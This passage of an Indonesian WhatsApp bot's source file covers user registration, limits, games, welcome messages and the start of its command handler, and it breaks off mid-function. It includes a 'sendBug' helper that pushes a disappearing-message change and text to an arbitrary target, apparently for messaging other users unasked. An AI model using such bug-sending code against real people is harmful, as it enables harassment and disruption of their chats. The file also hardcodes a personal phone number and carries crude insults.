// SC NYA JANGAN DI JUAL NGENTOD
//MAKASIH DAH PAKE 
//   -    y    -    \\
//--Recode By Fino--\\
//Error? wa.me/6288210864298
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const crypto = require('crypto');
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const hx = require('hxz-api');
const tod = require('tod-api');
const ra = require('ra-api');
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { lirikLagu } = require('./database/lirik.js');
const { wikiSearch } = require('./database/wiki.js');
const { herolist } = require('./database/herolist.js');
const { herodetails } = require('./database/herodetail.js');
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const antilink = JSON.parse(fs.readFileSync('./datauser/antilink.json'))
const setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
const imagenye = JSON.parse(fs.readFileSync('./database/img.json'))
const audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
const { jadibot, stopjadibot, listjadibot } = require('./database/jadibot')
const scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
const antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"));
const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
const nsfw = JSON.parse(fs.readFileSync("./datauser/nsfw.json"));
const _registered = JSON.parse(fs.readFileSync('./datauser/registred.json'));
const antivirtex = JSON.parse(fs.readFileSync('./datauser/antivirtex.json'))
const premium = JSON.parse(fs.readFileSync('./datauser/vip.json'))
const prem = JSON.parse(fs.readFileSync('./datauser/premium.json'))
const welkom = JSON.parse(fs.readFileSync('./datauser/welkom.json'));
const up = JSON.parse(fs.readFileSync('./datauser/setting.json'));
const samih = JSON.parse(fs.readFileSync('./datauser/simi.json'))
const ban = JSON.parse(fs.readFileSync('./datauser/banned.json'))
const _limit = JSON.parse(fs.readFileSync('./datauser/limit.json'));
const uang = JSON.parse(fs.readFileSync('./datauser/uang.json'));
const configs = JSON.parse(fs.readFileSync('./config.json'))
const vcard = 'BEGIN:VCARD\n' //jangan ganti eror jngn nyesel
            + 'VERSION:3.0\n' //biarin aja eror jngn nyesel
            + 'FN:Mr F\n' //ganti aja 
            + 'ORG: Fino julyan Anggara\n' //ganti aja
            + 'TEL;type=CELL;type=VOICE;waid=6288210864298:+6288210864298\n'  //ganti nomor lu
            + 'END:VCARD' //jangan ganti eror jangan nyesel
//👇*** jangan di ganti ***👇\\ 
//ganti auto error
function _0x4503(){const _0x34ea80=['70344lfhuRs','1892804ZxjSSK','132OvXxLz','•\x20Hexagonz(base)\x0a•\x20Baileys\x0a•\x20Finx999(pengembang)\x0a•\x20All\x20My\x20friend>//<','2085669jYzyrY','7qhNius','437556EcekTp','1yoAVlh','4350ayknaW','15275yjWRwa','3751CwWZba','3856336OEqYYw'];_0x4503=function(){return _0x34ea80;};return _0x4503();}const _0x29dc59=_0x2d9b;(function(_0x4e7ef1,_0x28188d){const _0x3dcdb=_0x2d9b,_0x1e2269=_0x4e7ef1();while(!![]){try{const _0x49af7d=-parseInt(_0x3dcdb(0x8b))/0x1*(parseInt(_0x3dcdb(0x84))/0x2)+-parseInt(_0x3dcdb(0x8a))/0x3+parseInt(_0x3dcdb(0x85))/0x4+-parseInt(_0x3dcdb(0x81))/0x5*(parseInt(_0x3dcdb(0x86))/0x6)+parseInt(_0x3dcdb(0x89))/0x7*(parseInt(_0x3dcdb(0x83))/0x8)+-parseInt(_0x3dcdb(0x88))/0x9+-parseInt(_0x3dcdb(0x8c))/0xa*(parseInt(_0x3dcdb(0x82))/0xb);if(_0x49af7d===_0x28188d)break;else _0x1e2269['push'](_0x1e2269['shift']());}catch(_0x1713cb){_0x1e2269['push'](_0x1e2269['shift']());}}}(_0x4503,0x4fd15));function _0x2d9b(_0xcfd28b,_0x50a14b){const _0x4503e6=_0x4503();return _0x2d9b=function(_0x2d9b2e,_0x288bee){_0x2d9b2e=_0x2d9b2e-0x81;let _0x3052d2=_0x4503e6[_0x2d9b2e];return _0x3052d2;},_0x2d9b(_0xcfd28b,_0x50a14b);}const thanksTo=_0x29dc59(0x87);
 limitawal = configs.limitCount //Ganti aja
 memberlimit = configs.memberLimit //Ganti aja
hargalimit = configs.hargaLimit //Ganti aja
banChats = true //Jangan di ganti
offline = false //Jangan di ganti
blocked = [] //jangan di ganti
targetpc = configs.ownerNumber //Ganti aja
ownerNumber = configs.ownerNumber //Ganti aja
namaBot = configs.botname //Ganti aja
namaOwner = configs.ownerName //Ganti aja
fake = configs.fake
namaig = 'instagram.com/'+configs.igName //ganti nama lu 
numbernye = '0'//Jangan di ganti
waktu = '-' //Jangan di ganti
alasan = '-' //Jangan di ganti
namabot = configs.botname //Ganti jdi nama bot lu
lolkey = configs.lolkey
baterai = {     //  {
    baterai: 0,  // { - jangan di ganti ntr rusak
    cas: false   // {
}
//=================================================//
//Function registered
const getRegisteredRandomId = () => {
  return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, age, time, serials) => {
  const obj = {
id: userid,
name: sender,
age: age,
time: time,
serial: serials
  }
  _registered.push(obj)
  fs.writeFileSync('./datauser/registred.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
  return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
  let status = false
  Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
  status = true
}
  })
  return status
}
//Function Limit and Atm!!!
const getLimit = (sender) => {
  let position = false
  Object.keys(limit).forEach ((i) => {
if (limit[position].id === sender) {
  position = i
}
  })
  if (position !== false) {
return limit[position].limit
  }
}
const addATM = (sender) => {
  const obj = {
id: sender, uang: 0
  }
  uang.push(obj)
  fs.writeFileSync('./datauser/uang.json',
JSON.stringify(uang))
}

const addKoinUser = (sender, amount) => {
  let position = false
  Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
  position = i
}
  })
  if (position !== false) {
uang[position].uang += amount
fs.writeFileSync('./datauser/uang.json', JSON.stringify(uang))
  }
}

const checkATMuser = (sender) => {
  let position = false
  Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
  position = i
}
  })
  if (position !== false) {
return uang[position].uang
  }
}

const bayarLimit = (sender, amount) => {
  let position = false
  Object.keys(_limit).forEach((i) => {
if (_limit[i].id === sender) {
  position = i
}
  })
  if (position !== false) {
_limit[position].limit -= amount
fs.writeFileSync('./datauser/limit.json', JSON.stringify(_limit))
  }
}

const confirmATM = (sender, amount) => {
  let position = false
  Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
  position = i
}
  })
  if (position !== false) {
uang[position].uang -= amount
fs.writeFileSync('./datauser/uang.json', JSON.stringify(uang))
  }
}

const limitAdd = (sender) => {
  let position = false
  Object.keys(_limit).forEach((i) => {
if (_limit[i].id == sender) {
  position = i
}
  })
  if (position !== false) {
_limit[position].limit += 1
fs.writeFileSync('./datauser/limit.json', JSON.stringify(_limit))
  }
}
// Sticker Cmd
//Func stikCmd
const addCmd = (id, command) => {
			const obj = { id: id, chats: command }
			scommand.push(obj)
			fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
			}
			
			const getCommandPosition = (id) => {
			let position = null
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			position = i }
			})
 
			if (position !== null) {
			return position }
			}
			
			const getCmd = (id) => {
			let position = null
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			position = i }
			})
			
			if (position !== null) {
			return scommand[position].chats }
			}
			const checkSCommand = (id) => {
			let status = false
			Object.keys(scommand).forEach((i) => {
			if (scommand[i].id === id) {
			status = true }
			})
			return status
			}


module.exports = hexa = async (hexa, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
//Group-Participant-Update
hexa.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await hexa.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				teks = `Hai @${num.split('@')[0]}
Selamat datang di
*${mdata.subject}*
────────────────
┏━━━━━━━━━━━━━━━━━━━━
┃──────〘  *Intro dulu tod!* 〙───────
┃━━━━━━━━━━━━━━━━━━━━
┠⊷️ *Nama* :
┠⊷️ *Umur* :
┠⊷️ *Asal Kota* :
┠⊷️ *Gender* :
┠⊷️ *KALO SIDER/TUMPANG NYIMAK GAUSAH MASUK TOD SOAL NYA MASIH BANYAK YANG PENGEN MASUK ANJG*
┗━━━━━━━━━━━━━━━━━━━━
Ketik ${prefix}verify untuk memulai menggunakan bot.`
				hexa.sendMessage(mdata.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				teks = `Selamat tinggal @${num.split('@')[0]}👋`
				hexa.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	//Batre
hexa.on('CB:action,,battery', json => {
	const a = json[2][0][1].value
	const b = json[2][0][1].live
	baterai.baterai = a
	baterai.cas = b
})
//Block list
	hexa.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	//Function waktu,tanggal
var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var thexal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilThexa = "" + hari + ", " + thexal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Jam : " + jam + ":" + menit + ":" + detik + " Wib";
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')
//Time
if(time < "23:59:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                        }
if(time < "19:00:00"){
var ucapanWaktu = 'Selamat Petang Kak'
                                         }
if(time < "18:00:00"){
var ucapanWaktu = 'Selamat Sore Kak'
                                         }
if(time < "15:00:00"){
var ucapanWaktu = 'Selamat Siang Kak'
                                         }
if(time < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi Kak'
                                         }
if(time < "05:00:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                         }
   //WAKTU BUAT FAKEREPLY
//end
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛`; break;
            }
            var YahahaHayyuk = "" + waktoonyabro;
//Selesai     
//New game 
const slot1 = ['🍋','🍐','🍓','🍇','🍒']
            const slot2 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot3 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot4 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot5 = ['🍋','🍐','🍓','🍇','🍒']
            const slot6 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot7 = ['🍋','🍐','🍓','🍇','🍒']
            const slot8 = ['🍋','🍐','🍓','🍇','🍒']   
            const slot9 = ['🍋','🍐','🍓','🍇','🍒']
            const notc = ['😊','😃','😗','🙂','😶','😣','🙁','😞','😬']
            const oxo1 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const oxo2 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']  
            const oxo3 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const hexa1 = ['1','2','3','4','5','6','7','8','9']
            const hexa2 = ['1','2','3','4','5','6','7','8','9']
            const hexa3 = hexa1[Math.floor(Math.random() * (hexa1.length))]
            const hexa4 = hexa2[Math.floor(Math.random() * (hexa2.length))] 
            const oxo11 = oxo1[Math.floor(Math.random() * (oxo1.length))]
            const notc1 = notc[Math.floor(Math.random() * (notc.length))]
            const oxo22 = oxo2[Math.floor(Math.random() * (oxo2.length))]
            const oxo33 = oxo3[Math.floor(Math.random() * (oxo3.length))]
            const slot11 = slot1[Math.floor(Math.random() * (slot1.length))]
		    const slot22 = slot2[Math.floor(Math.random() * (slot2.length))]
		    const slot33 = slot3[Math.floor(Math.random() * (slot3.length))]
		    const slot44 = slot4[Math.floor(Math.random() * (slot4.length))]
			const slot55 = slot5[Math.floor(Math.random() * (slot5.length))]
			const slot66 = slot6[Math.floor(Math.random() * (slot6.length))]	
		    const slot77 = slot4[Math.floor(Math.random() * (slot7.length))]
		    const slot88 = slot5[Math.floor(Math.random() * (slot8.length))]
			const slot99 = slot6[Math.floor(Math.random() * (slot9.length))]
			
const type = Object.keys(mek.message)[0]        
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
     const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()	
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
      const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
			const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = hexa.user.jid
		const botNumberss = hexa.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
const isOwner = ownerNumber.includes(sender)
const isAntilink = isGroup ? antilink.includes(from) : false;
const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
const sendBug = async(target, teks) => {
           if (!teks) teks = '.'
           await hexa.relayWAMessage(hexa.
           prepareMessageFromContent(target, hexa.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:true})
           hexa.sendMessage(target, teks, 'conversation')
}
		// const isSelfNumber = config.NomorSELF
const isWelkom = isGroup ? welkom.includes(from) : false
const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
const isAntiviewonce = isGroup ? antivo.includes(from) : false;
 const isKickarea = isGroup ? kickarea.includes(from) : false;
const isNsfw = isGroup ? nsfw.includes(from) : false
		const totalchat = await hexa.chats.all()
		const groupMetadata = isGroup ? await hexa.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
  const stickCmd = type == 'stickerMessage' ? mek.message.stickerMessage.fileSha256.toString('base64') : '' || ''
  const isAntiLink = isGroup ? antilink.includes(from) : false
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
const isBanned = ban.includes(sender)
const vip = ["6288210864298@s.whatsapp.net"]
const id = '6288210864298d@s.whatsapp.net' 
const hariRaya = new Date('mei 3, 2022 07:00:00')
const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
						const isSimi = isGroup ? samih.includes(from): false
   const request = require('request')
    const isRegister = checkRegisteredUser(sender)
    const isPrem = prem.includes(sender)
    const isPremium = premium.includes(sender)
       var ase = new Date();
      var waktoo = ase.getHours();
      const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = hexa.user.phone
      var tampilHari = "" + waktoo;
        const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'


        //MESS
		mess = {
			wait: '𝙾𝚃𝚆 𝚃𝚄𝙽𝙶𝚄 𝙱𝙽𝚃𝚁',
			success: '𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻',
			wrongFormat: '𝙵𝙾𝚁𝙼𝙰𝚃 𝚂𝙰𝙻𝙰𝙷',
			sukses: 'Berhasil gan',
only: {
				group: 'Khusus grup ngab',
				admin: 'Khusus admin bang',
				Badmin: `jadiin ${namabot} admin`,
		  register: `Kamu belum terdaftar di database,silahkan ketik ${prefix}verify`,
		  banned: `Kamu ter banned, untuk membuka banned,silahkan hubungu ${prefix}owner\nTerima kasih`,
		  owner: 'Khusus owner bang',
		  premium: `Khusus premium sat, mau premium? chat ${prefix}owner(Berbayar)`
				},
			error: {
				stick: '𝙸𝚃𝚄 𝙱𝚄𝙺𝙰𝙽 𝚂𝚃𝙸𝙲𝙺𝙴 𝙰𝚂𝚄',
				Iv: '𝙻𝙸𝙽𝙺𝙽𝚈𝙰𝚂𝙰𝙻𝙰𝙷'
			},
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            hexa.sendMessage(from, teks, text, {quoted:ftoko})
        }
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      hexa.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
        const sendMess = (hehe, teks) => {
            hexa.sendMessage(hehe, teks, text)
        }
const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? hexa.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hexa.sendMessage(from, teks.trim(), extendedText, { quoted: ftroli, contextInfo: { "mentionedJid": memberr } })
        }
        
           const sendFile = async(link, type, options) => {
       hasil = await getBuffer(link)
       hexa.sendMessage(from, hasil, type, options).catch(e => {
       fetchh(link).then((hasil) => {
